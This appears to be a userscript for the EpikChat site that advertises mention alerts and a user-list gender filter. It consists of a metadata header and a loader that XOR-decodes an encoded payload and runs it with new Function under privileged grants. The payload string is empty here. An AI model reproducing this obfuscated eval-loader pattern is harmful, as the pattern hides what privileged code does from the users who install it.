// ==UserScript==
// @name         Epik Power Tools
// @namespace    epik.powertools
// @version      0.0.43
// @description  Mention alerts, reply alerts, message highlighting and a user-list gender filter for EpikChat
// @author       MurderCity420
// @match        https://epikchat.com/*
// @match        https://*.epikchat.com/*
// @run-at       document-end
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @grant        unsafeWindow
// @connect      raw.githubusercontent.com
// @connect      githubusercontent.com
// @connect      github.com
// @downloadURL  https://raw.githubusercontent.com/MurderCity420/Epik-Power-Tools/main/Epik-Power-Tools.user.js
// @updateURL    https://raw.githubusercontent.com/MurderCity420/Epik-Power-Tools/main/Epik-Power-Tools.user.js
// ==/UserScript==

unsafeWindow.EPT_VERSION = "0.0.43";
unsafeWindow.EPT_ICONS = {
    // Emoji live out here, OUTSIDE the XOR pass, so multi-byte Unicode isn't
    // mangled by the byte-wise encode. Add new icon keys here, not in src/.
    mentionFlash:  '🔔 Mention!',   // 🔔 Mention!
    replyFlash:    '💬 Reply!',     // 💬 Reply!
    viewerFlash:   '👁 Viewer!',    // 👁 Viewer!
    upgrade:       '⬆',             // ⬆
    preview:       '▶',             // ▶
    del:           '🗑',            // 🗑
    lock:          '🔒',            // 🔒
    docs:          '📖',            // 📖
    warn:          '⚠',             // ⚠
};

(function(GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, GM_xmlhttpRequest, unsafeWindow){
    var k = "aHR0cHM6Ly93d3cuZXBpa2NoYXQuY29tLw==";
    var p = "";
    var d = atob(p);
    var bytes = new Uint8Array(d.length);
    for (var i = 0; i < d.length; i++) {
        bytes[i] = d.charCodeAt(i) ^ k.charCodeAt(i % k.length);
    }
    var s = new TextDecoder('utf-8').decode(bytes);
    (new Function('GM_setValue','GM_getValue','GM_deleteValue','GM_listValues','GM_xmlhttpRequest','unsafeWindow', s))
        (GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, GM_xmlhttpRequest, unsafeWindow);
})(GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, typeof GM_xmlhttpRequest !== 'undefined' ? GM_xmlhttpRequest : undefined, unsafeWindow);
